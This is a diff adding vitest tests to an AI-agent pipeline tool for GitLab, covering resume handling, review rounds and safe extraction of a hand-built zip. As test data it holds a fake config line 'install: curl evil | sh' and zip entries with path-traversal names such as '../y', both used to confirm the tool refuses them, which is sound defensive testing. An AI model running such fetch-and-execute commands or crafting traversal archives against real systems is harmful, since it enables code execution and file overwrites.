@@ -1,8 +1,9 @@
-import { existsSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
+import { existsSync, mkdirSync, mkdtempSync, readFileSync, writeFileSync } from "node:fs";
+import { crc32 } from "node:zlib";
 import { tmpdir } from "node:os";
 import { join } from "node:path";
 import { expect, test } from "vitest";
-import { GITLAB_URL, makeContext, runStep } from "./context";
+import { extractRun, GITLAB_URL, makeContext, runStep } from "./context";
 import { GitLab, NotFactoryPipelineError } from "../gitlab";
 import { BOT, B, fakeWorld, mrEvent, runBuildJobs, runBuildPipeline, runFinishPipeline } from "./test-helpers";
 
@@ -382,4 +383,93 @@ test("a resume with a forged record, a record of another work item, or no saved 
     expect(w.claudeRuns).toHaveLength(0);
     expect(w.restored).toEqual([]);
   }
+});
+
+// Fix round 1.
+const resumeWorld = (o: Parameters<typeof fakeWorld>[0], first: { record: unknown }) => {
+  const w = fakeWorld({ liveLabels: ["factory_waiting"], ...o });
+  w.ctx.env = { ...w.ctx.env, payload: undefined, workItemIid: 8, buildPipelineId: 1, factoryProjectId: 3 };
+  w.ctx.gitlab.buildRecord = async () => first.record;
+  return w;
+};
+test("a resume runs the .factory.yml commands read before the agent ran, not the restored clone's", async () => {
+  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
+  const w = resumeWorld({ jev1: { risk: "trivial" }, prepare: "limit", factoryFile: "install: curl evil | sh\nlint: evil\ntest: evil\nbuild: evil\n" }, first);
+  await runBuildJobs(w, tmp());
+  expect(w.ran.length).toBeGreaterThan(0);
+  expect(w.ran.some((c) => c.includes("evil"))).toBe(false);
+  expect(w.ran).toContain("pnpm install --frozen-lockfile");
+});
+test("a resumed code review continues its round count and the saved session", async () => {
+  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, reviews: [[B]], fixLimit: true }));
+  expect(first.labels).toEqual(["factory_waiting"]);
+  expect(first.record.rounds.review).toBe(1);
+  const w = resumeWorld({ jev1: { risk: "trivial" }, reviews: [[B], [B], [B]] }, first);
+  await runBuildJobs(w, tmp());
+  expect(w.reviewsRun).toBe(2); // rounds 2 and 3 only
+  expect(w.record.rounds.review).toBe(3);
+  expect(w.claudeRuns[0]).toMatchObject({ resumeSessionId: "sess-limit" });
+  expect(w.labels).toEqual(["factory_blocked"]);
+});
+test("a resume stops quietly when the item is no longer waiting, or the repo is full", async () => {
+  const first = await runBuildPipeline(fakeWorld({ jev1: { risk: "trivial" }, prepare: "limit" }));
+  const notWaiting = resumeWorld({ liveLabels: ["factory_running"] }, first);
+  await runBuildJobs(notWaiting, tmp());
+  expect(notWaiting.record.steps.at(-1)?.data).toMatchObject({ start: false, reason: "not-waiting" });
+  expect(notWaiting.labels).toEqual(["factory_running"]);
+  const full = resumeWorld({}, first);
+  full.ctx.gitlab.countLabeled = async () => 1; // 4 active runs, this one included
+  await runBuildJobs(full, tmp());
+  expect(full.record.steps.at(-1)?.data).toMatchObject({ start: false, reason: "repo-full" });
+  for (const w of [notWaiting, full]) {
+    expect(w.restored).toEqual([]);
+    expect(w.claudeRuns).toHaveLength(0);
+    expect(w.workItemComments).toHaveLength(0);
+  }
+  expect(full.labels).toEqual(["factory_waiting"]);
+});
+test("a resume whose record cannot be read now waits for the next retry instead of blocking", async () => {
+  const w = fakeWorld({ liveLabels: ["factory_waiting"] });
+  w.ctx.env = { ...w.ctx.env, payload: undefined, workItemIid: 8, buildPipelineId: 1, factoryProjectId: 3 };
+  w.ctx.gitlab.buildRecord = async () => { throw new Error("GitLab GET failed with status 503"); };
+  const dir = tmp();
+  await runBuildJobs(w, dir);
+  expect(w.labels).toEqual(["factory_waiting"]);
+  expect(w.workItemComments).toHaveLength(0);
+  expect(readFileSync(join(dir, "stop"), "utf8")).toBe("event");
+});
+
+// A stored (not compressed) zip, written by hand so the test can hold any entry name.
+function zip(files: Record<string, string>): Buffer {
+  const local: Buffer[] = [];
+  const central: Buffer[] = [];
+  let offset = 0;
+  for (const [name, text] of Object.entries(files)) {
+    const n = Buffer.from(name);
+    const data = Buffer.from(text);
+    const crc = crc32(data);
+    const h = Buffer.alloc(30);
+    h.writeUInt32LE(0x04034b50, 0); h.writeUInt16LE(10, 4); h.writeUInt32LE(crc, 14);
+    h.writeUInt32LE(data.length, 18); h.writeUInt32LE(data.length, 22); h.writeUInt16LE(n.length, 26);
+    const c = Buffer.alloc(46);
+    c.writeUInt32LE(0x02014b50, 0); c.writeUInt16LE(20, 4); c.writeUInt16LE(10, 6); c.writeUInt32LE(crc, 16);
+    c.writeUInt32LE(data.length, 20); c.writeUInt32LE(data.length, 24); c.writeUInt16LE(n.length, 28); c.writeUInt32LE(offset, 42);
+    local.push(h, n, data);
+    central.push(c, n);
+    offset += h.length + n.length + data.length;
+  }
+  const cd = Buffer.concat(central);
+  const end = Buffer.alloc(22);
+  end.writeUInt32LE(0x06054b50, 0); end.writeUInt16LE(central.length / 2, 8); end.writeUInt16LE(central.length / 2, 10);
+  end.writeUInt32LE(cd.length, 12); end.writeUInt32LE(offset, 16);
+  return Buffer.concat([...local, cd, end]);
+}
+test("extractRun restores run/ without the stop file and writes nothing outside run/", async () => {
+  const base = tmp();
+  const cwd = join(base, "job");
+  mkdirSync(cwd);
+  await extractRun(zip({ "run/record.json": "{}", "run/stop": "prepare-patch", "run/../x": "evil", "../y": "evil", "z": "evil" }), cwd);
+  expect(readFileSync(join(cwd, "run/record.json"), "utf8")).toBe("{}");
+  expect(existsSync(join(cwd, "run/stop"))).toBe(false);
+  for (const p of [join(cwd, "x"), join(base, "y"), join(cwd, "z")]) expect(existsSync(p)).toBe(false);
 });
